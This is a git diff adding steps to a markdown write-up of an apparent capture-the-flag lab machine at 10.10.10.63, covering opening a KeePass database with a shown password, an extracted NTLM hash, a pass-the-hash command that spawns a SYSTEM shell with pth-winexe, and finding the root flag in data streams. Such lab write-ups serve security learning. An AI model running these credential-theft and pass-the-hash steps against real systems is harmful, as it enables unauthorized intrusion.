@@ -206,3 +206,22 @@ Database Password: moonshine1
 ▶ kpcli --kdb CEH.kdbx 
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236424236-8de83712-3f0a-46e0-876d-c2ec3dccff42.png)
+  - Checking Entries
+![image](https://user-images.githubusercontent.com/83878909/236429504-cb34c0b6-d942-45c2-a0f1-9fd68b9d69b4.png)
+
+### NTLM Hash
+```CSS
+aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+```
+
+### Pass the Hash Attack
+```CSS
+▶ pth-winexe --user=administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 --system //10.10.10.63 cmd.exe
+```
+![image](https://user-images.githubusercontent.com/83878909/236430575-90129cb0-9af9-4a9b-8a09-bb6f600b9b1e.png)
+
+## Root Flag
+![image](https://user-images.githubusercontent.com/83878909/236431367-55a20192-5af7-445e-87b0-022fa53bb53f.png)
+  - Check associated streams.
+![image](https://user-images.githubusercontent.com/83878909/236431881-6f6e76d2-eb3b-4e27-8298-525643b37b1d.png)
+
